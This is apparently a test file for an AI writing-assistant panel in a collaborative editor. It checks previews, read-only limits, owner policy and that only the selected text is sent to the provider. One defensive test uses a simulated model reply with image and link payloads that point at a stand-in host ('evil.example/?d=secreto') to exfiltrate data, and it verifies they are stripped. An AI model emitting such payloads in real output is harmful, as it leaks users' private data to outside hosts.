// @vitest-environment jsdom
import 'fake-indexeddb/auto';
import type { PartialBlock } from '@blocknote/core';
import { TextSelection } from '@tiptap/pm/state';
import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import * as Y from 'yjs';
import { ServicesContext, type Services } from '../services';
import type { SupabaseRemote } from '../sync/remote';
import { FakeServer, makeDevice, type Device } from '../sync/testing';
import { mountEditor, posOf, typeAt, unmountAll, view, type Editor } from '../ui/collabHarness';
import { legacyStorageNames, WANKA_LOCAL_KEY } from '../workspace';
import { AssistantPanel } from './AssistantPanel';
import { closeAssistant, registerAssistantTarget } from './assistantUi';
import { closeAssistantDb, saveSettings } from './keyStore';

// El panel del asistente con el editor real y un proveedor simulado (Docs/Doc_Asistente.md, pruebas 5, 7, 8 y 9 de la
// sección 13): pedir, ver la vista previa, aplicar; sin clave; sin Editar; sin red; la política del dueño; lo que se
// manda (nada más que lo elegido) y que la vista previa no pide nada afuera.

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

beforeAll(() => {
  window.matchMedia ??= ((query: string) => ({
    matches: false,
    media: query,
    onchange: null,
    addEventListener: () => undefined,
    removeEventListener: () => undefined,
    addListener: () => undefined,
    removeListener: () => undefined,
    dispatchEvent: () => false,
  })) as never;
});

const KEY = 'sk-ant-api03-PANEL-secreta-55555';
const roots: Root[] = [];
const devices: Device[] = [];
const offTargets: (() => void)[] = [];

afterEach(async () => {
  for (const r of roots.splice(0)) act(() => r.unmount());
  for (const off of offTargets.splice(0)) off();
  closeAssistant();
  unmountAll();
  for (const d of devices.splice(0)) {
    await d.engine.stop();
    d.db.close();
    d.mediaDb.close();
    d.commentsDb.close();
  }
  await closeAssistantDb();
  indexedDB.deleteDatabase('shotdocs-assistant');
  vi.unstubAllGlobals();
  localStorage.clear();
  document.body.innerHTML = '';
});

const wait = (ms = 20) => act(async () => new Promise((r) => setTimeout(r, ms)));

function services(d: Device, client: unknown = { auth: {} }): Services {
  const config = { url: 'https://znlvpuddswymxpffgvbz.supabase.co', publishableKey: 'sb_publishable_test', name: 'Wanka', localKey: WANKA_LOCAL_KEY, storage: legacyStorageNames(WANKA_LOCAL_KEY) };
  return {
    workspace: { config, client },
    client,
    user: { id: d.remote.userId, email: 'lega@wanka.tv' },
    db: d.db,
    tree: d.tree,
    docs: d.docs,
    files: d.files,
    media: d.media,
    engine: d.engine,
    access: d.access,
    remote: d.remote as unknown as SupabaseRemote,
    dbName: 'test',
    mediaDb: d.mediaDb,
    comments: d.comments,
    commentsDb: d.commentsDb,
    sizes: d.sizes,
    offline: d.offline,
    shutdown: async () => undefined,
  } as Services;
}

/** Un `fetch` de proveedor simulado (Anthropic) que contesta `answer` por partes y anota los pedidos. */
function provider(answer: string | ((body: { messages: { content: string }[] }) => string), opts: { status?: number; body?: unknown } = {}) {
  const calls: { url: string; body: string; headers: Record<string, string> }[] = [];
  const fetcher = vi.fn(async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const body = String(init.body ?? '');
    calls.push({ url: String(input), body, headers: init.headers as Record<string, string> });
    if (opts.status) return new Response(JSON.stringify(opts.body ?? {}), { status: opts.status });
    const text = typeof answer === 'string' ? answer : answer(JSON.parse(body));
    const events = [
      { type: 'message_start', message: { usage: { input_tokens: 1240 } } },
      ...text.match(/[\s\S]{1,5}/g)!.map((t) => ({ type: 'content_block_delta', delta: { type: 'text_delta', text: t } })),
      { type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 512 } },
      { type: 'message_stop' },
    ];
    return new Response(events.map((e) => `data: ${JSON.stringify(e)}`).join('\n\n') + '\n\n', { status: 200 });
  });
  vi.stubGlobal('fetch', fetcher);
  return { calls, fetcher };
}

interface Setup {
  host: HTMLElement;
  ed: Editor;
  device: Device;
  pageId: string;
}

async function setup(opts: { key?: boolean; editable?: boolean; client?: unknown; blocks?: unknown[]; offline?: boolean; baseUrl?: string } = {}): Promise<Setup> {
  const server = new FakeServer();
  const device = await makeDevice(server);
  devices.push(device);
  const pageId = await device.tree.create(null, 'Reporte secreto del rodaje');
  await device.engine.syncNow();
  if (opts.offline) {
    server.online = false;
    await device.engine.syncNow().catch(() => undefined);
  }
  if (opts.key !== false) {
    if (opts.baseUrl) await saveSettings('lega@wanka.tv', { provider: 'compatible', baseUrl: opts.baseUrl, model: 'llama3', models: [] }, '');
    else await saveSettings('lega@wanka.tv', { provider: 'anthropic', model: 'claude-haiku-4-5', models: [] }, KEY);
  }
  const ed = mountEditor(new Y.Doc());
  ed.replaceBlocks(
    ed.document,
    (opts.blocks ?? [
      { id: 'p', type: 'paragraph', content: 'el kamara se movio en la toma 3' },
      { id: 'q', type: 'paragraph', content: 'Presupuesto interno: no mandar.' },
    ]) as PartialBlock[],
  );
  const editable = opts.editable ?? true;
  offTargets.push(registerAssistantTarget({ pageId, view: () => view(ed), editable: () => editable }));
  const host = document.createElement('div');
  document.body.append(host);
  const root = createRoot(host);
  roots.push(root);
  act(() =>
    root.render(
      <ServicesContext.Provider value={services(device, opts.client)}>
        <AssistantPanel pageId={pageId} />
      </ServicesContext.Provider>,
    ),
  );
  await wait(80);
  return { host, ed, device, pageId };
}

const button = (host: HTMLElement, text: string) => [...host.querySelectorAll('button')].find((b) => b.textContent?.trim() === text) as HTMLButtonElement | undefined;

async function click(el: HTMLElement | undefined) {
  if (!el) throw new Error('no button');
  await act(async () => {
    el.click();
  });
  await wait(60);
}

function selectAll(ed: Editor, id: string, a: number, b: number) {
  const v = view(ed);
  v.dispatch(v.state.tr.setSelection(TextSelection.create(v.state.doc, posOf(ed, id) + 2 + a, posOf(ed, id) + 2 + b)));
}

const blockText = (ed: Editor, id: string) => ((ed.getBlock(id)?.content ?? []) as { text?: string }[]).map((c) => c.text ?? '').join('');

describe('el panel', () => {
  it('sin clave: ofrece configurar el asistente', async () => {
    const { host } = await setup({ key: false });
    expect(host.textContent).toContain('Set up the assistant');
    expect(button(host, 'Fix spelling & grammar')).toBeUndefined();
  });

  it('Fix → vista previa por palabras → Apply: la página cambia y queda un aviso para deshacer; los tokens del proveedor', async () => {
    const { host, ed } = await setup();
    const { calls } = provider('La cámara se movió en la toma 3');
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Fix spelling & grammar'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    expect(calls).toHaveLength(1);
    const diff = host.querySelector('.assistant-diff')!;
    expect([...diff.querySelectorAll('del')].map((d) => d.textContent)).toEqual(['el kamara', 'movio']);
    expect(diff.textContent).toBe('el kamaraLa cámara se moviomovió en la toma 3');
    expect([...diff.querySelectorAll('ins')].map((d) => d.textContent)).toEqual(['La cámara', 'movió']);
    expect(host.querySelector('.assistant-foot')?.textContent).toContain('1,240 in · 512 out');
    expect(blockText(ed, 'p')).toBe('el kamara se movio en la toma 3');
    await click(button(host, 'Apply'));
    expect(blockText(ed, 'p')).toBe('La cámara se movió en la toma 3');
    expect(host.textContent).toContain('Applied. Undo it with Ctrl+Z.');
    ed.undo();
    expect(blockText(ed, 'p')).toBe('el kamara se movio en la toma 3');
  });

  it('si el texto cambió mientras pensaba, Apply no aplica nada y lo dice', async () => {
    const { host, ed } = await setup();
    provider('La cámara se movió en la toma 3');
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Fix spelling & grammar'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    typeAt(ed, 'p', 9, ' nueva');
    await click(button(host, 'Apply'));
    expect(host.textContent).toContain('This text changed while the assistant was working. Nothing was applied.');
    expect(blockText(ed, 'p')).toBe('el kamara nueva se movio en la toma 3');
    // Try again pide de nuevo sobre lo que hay hoy en el mismo lugar.
    const { calls } = provider('La cámara nueva se movió en la toma 3');
    await click(button(host, 'Try again'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    expect(JSON.parse(calls[0].body).messages[0].content).toContain('el kamara nueva se movio en la toma 3');
  });

  it('Ctrl+Enter aplica y Esc descarta (con el foco en el panel)', async () => {
    const { host, ed } = await setup();
    provider('La cámara se movió en la toma 3');
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Fix spelling & grammar'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    const panel = host.querySelector<HTMLElement>('.assistant-panel')!;
    await act(async () => {
      panel.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
    });
    expect(button(host, 'Apply')).toBeUndefined();
    expect(blockText(ed, 'p')).toBe('el kamara se movio en la toma 3');
    await click(button(host, 'Fix spelling & grammar'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    await act(async () => {
      panel.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', ctrlKey: true, bubbles: true }));
    });
    expect(blockText(ed, 'p')).toBe('La cámara se movió en la toma 3');
  });

  it('sin Editar: Fix, Improve y Shorter apagados, Translate sí, y sin Apply (solo Copy)', async () => {
    const { host, ed } = await setup({ editable: false });
    expect(host.textContent).toContain('You can view this page but not edit it');
    expect(button(host, 'Fix spelling & grammar')?.disabled).toBe(true);
    expect(button(host, 'Improve writing')?.disabled).toBe(true);
    expect(button(host, 'Make shorter')?.disabled).toBe(true);
    expect(button(host, 'Translate to…')?.disabled).toBe(false);
    provider('the camera moved in shot 3');
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Translate to…'));
    for (let i = 0; i < 20 && !button(host, 'Copy'); i++) await wait(30);
    expect(button(host, 'Apply')?.disabled).toBe(true);
    await click(button(host, 'Apply'));
    expect(blockText(ed, 'p')).toBe('el kamara se movio en la toma 3');
  });

  it('sin red: dice que necesita internet y no pide nada; con un modelo local se intenta igual', async () => {
    let s = await setup({ offline: true });
    expect(s.host.textContent).toContain('The assistant needs internet.');
    expect(button(s.host, 'Fix spelling & grammar')?.disabled).toBe(true);
    for (const r of roots.splice(0)) act(() => r.unmount());
    s = await setup({ offline: true, baseUrl: 'http://localhost:11434/v1' });
    expect(s.host.textContent).not.toContain('The assistant needs internet.');
    expect(button(s.host, 'Fix spelling & grammar')?.disabled).toBe(false);
  });

  it('la política del dueño: Off apaga todo; Local models only deja solo un modelo local', async () => {
    const client = (policy: string) => ({ auth: {}, from: () => ({ select: () => ({ maybeSingle: async () => ({ data: { assistant_policy: policy }, error: null }) }) }) });
    let s = await setup({ client: client('off') });
    expect(s.host.textContent).toContain('The owner of this workspace turned the assistant off.');
    expect(button(s.host, 'Fix spelling & grammar')?.disabled).toBe(true);
    for (const r of roots.splice(0)) act(() => r.unmount());
    s = await setup({ client: client('local_only') });
    expect(s.host.textContent).toContain('Only local models are allowed in this workspace.');
    expect(button(s.host, 'Translate to…')?.disabled).toBe(true);
    for (const r of roots.splice(0)) act(() => r.unmount());
    s = await setup({ client: client('local_only'), baseUrl: 'http://127.0.0.1:1234/v1' });
    expect(s.host.textContent).not.toContain('Only local models');
    expect(button(s.host, 'Fix spelling & grammar')?.disabled).toBe(false);
  });

  it('lo que se manda: solo lo elegido, entre <user_content>; ni el título, ni el workspace, ni el correo, ni el resto de la página, ni la clave en el cuerpo', async () => {
    const { host, ed } = await setup({
      blocks: [
        { id: 'p', type: 'paragraph', content: [{ type: 'text', text: 'el kamara ', styles: {} }, { type: 'photo', props: { url: 'sdmedia://foto-secreta', name: 'set.jpg', w: 0.3 } }, { type: 'link', href: 'https://interno.example/presupuesto', content: 'ver' }] },
        { id: 'q', type: 'paragraph', content: 'Presupuesto interno: no mandar.' },
      ],
    });
    const { calls } = provider('La cámara ⟦photo:1⟧⟦link:1⟧ver⟦/link⟧');
    selectAll(ed, 'p', 0, 14);
    await click(button(host, 'Fix spelling & grammar'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    expect(calls).toHaveLength(1);
    const sent = calls[0].body;
    expect(sent).toContain('<user_content>\\nel kamara ⟦photo:1⟧⟦link:1⟧ver⟦/link⟧\\n</user_content>');
    for (const secret of ['Presupuesto interno', 'Reporte secreto', 'Wanka', 'lega@wanka.tv', 'sdmedia', 'foto-secreta', 'interno.example', KEY]) expect(sent, secret).not.toContain(secret);
    // La clave va solo en su header, al proveedor.
    expect(calls[0].url).toBe('https://api.anthropic.com/v1/messages');
    expect(calls[0].headers['x-api-key']).toBe(KEY);
  });

  it('una respuesta con una imagen o un link a otro sitio no pide nada al dibujar la vista previa (los links nuevos se sacan)', async () => {
    const { host, ed } = await setup();
    const { fetcher } = provider('el kamara ![x](https://evil.example/?d=secreto) <img src="https://evil.example/a.png"> [se movio](https://evil.example) en la toma 3');
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Improve writing'));
    for (let i = 0; i < 20 && !button(host, 'Apply'); i++) await wait(30);
    expect(fetcher).toHaveBeenCalledTimes(1);
    expect(host.querySelectorAll('img, iframe, video, audio, object, embed, [src], [href]')).toHaveLength(0);
    expect(host.textContent).toContain('Links added by the assistant were removed.');
  });

  it('un 401 se explica sin mostrar la clave; Stop corta lo que llega', async () => {
    const { host, ed } = await setup();
    provider('', { status: 401, body: { type: 'error', error: { type: 'authentication_error', message: `invalid x-api-key ${KEY}` } } });
    selectAll(ed, 'p', 0, 31);
    await click(button(host, 'Fix spelling & grammar'));
    expect(host.textContent).toContain('Anthropic rejected the key.');
    expect(host.innerHTML).not.toContain(KEY);
  });

  it('una respuesta que saca una foto no se puede aplicar (se puede copiar)', async () => {
    const { host, ed } = await setup({
      blocks: [{ id: 'p', type: 'paragraph', content: [{ type: 'text', text: 'el kamara ', styles: {} }, { type: 'photo', props: { url: 'sdmedia://foto', name: 'set.jpg', w: 0.3 } }, { type: 'text', text: ' se movio', styles: {} }] }],
    });
    provider('La cámara se movió');
    selectAll(ed, 'p', 0, 19);
    await click(button(host, 'Make shorter'));
    for (let i = 0; i < 20 && !host.querySelector('.assistant-error'); i++) await wait(30);
    expect(host.textContent).toContain('The suggestion would remove a photo or a block.');
    expect(button(host, 'Apply')).toBeUndefined();
    expect(button(host, 'Copy')).toBeDefined();
  });
});
